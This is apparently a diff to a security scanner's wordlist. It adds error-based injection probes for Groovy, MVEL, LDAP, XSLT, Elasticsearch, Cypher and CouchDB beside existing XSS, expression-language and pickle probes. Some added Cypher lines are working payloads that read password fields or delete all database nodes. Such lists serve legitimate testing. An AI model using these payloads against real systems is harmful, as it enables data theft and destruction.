@@ -172,6 +172,10 @@ raise "probe"
 Import-Module InvalidModule
 java.lang.Runtime.getRuntime().exec("invalidcmd")
 ${T(java.lang.Runtime).getRuntime().exec("invalidcmd")}
+##Groovy Code Injection - Error##
+throw new Exception('1337')
+1/0
+new GroovyShell().evaluate('invalid syntax {{{}}}')
 ##XSS - Error (event handlers)##
 <body onload=alert(1337)>
 <input onfocus=alert(1337) autofocus>
@@ -236,6 +240,8 @@ C:\nonexistent\path\file.txt
 %{invalid}
 ${T(invalid.Class)}
 ${1/0}
+##MVEL Expression Injection - Error##
+throw new Exception("1337")
 ##Prototype Pollution - Error##
 {"__proto__":{"polluted":"1337"},"test":null,"error":"probe"}
 constructor.prototype.polluted=1337&__proto__[test]=undefined
@@ -264,6 +270,45 @@ AAAA%08x.%08x.%08x.%08x
 {.__class__.__init__.__globals__}
 ##Format String - Error (Overflow/Boundary)##
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+##LDAP Injection - Error-Based##
+*)(cn=*))(|(cn=*
+)(objectClass=*
+*)(|(password=*
+)(
+))((
+*))(&(
+(|(cn=*)(cn=*
+*)(cn=*)(|
+*)(&(objectClass=*)(!
+*)(invalidop=*
+##XSLT Injection - Error-Based##
+<xsl:invalid/>
+<xsl:value-of select="unknown_function()"/>
+<xsl:value-of select="///"/>
+<xsl:value-of select="[invalid xpath"/>
+<xsl:value-of select="concat("/>
+<xsl:template match="###"/>
+<xsl:for-each select="$nonexistent"/>
+##Elasticsearch Injection - Error-Based##
+{"query":{"invalid_query_type":{}}}
+{"query":{"match":{"_all":{"query":"test","invalid_param":true}}}}
+}{
+{"script":{"source":"invalid syntax here"}}
+{"query":{"bool":{"must":[{"match":{"nonexistent_field_xyz":""}}],"invalid_clause":{}}}}
+{"query":{"range":{"id":{"gte":null,"format":"bad"}}}}
+{"size":-1}
+##Cypher Injection - Error-Based##
+' OR 1=1 //
+') OR 1=1 //
+' UNION MATCH (n) RETURN n //
+') RETURN 1 AS x UNION MATCH (n) RETURN n.password AS x //
+' OR 1=1 WITH n RETURN n //
+') MATCH (n) DETACH DELETE n //
+##CouchDB Injection - Error-Based##
+{"selector":{"$invalid_op":"test"}}
+{"invalid json
+{"selector":{"name":{"$exists":true}},"invalid_field":1}
+{"selector":{"name":{"$elemMatch":{"$invalid":1}}}}
 ##Python Pickle P0 - Error (1/0)##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
 ##Python Pickle P0 - Error (bad import)##
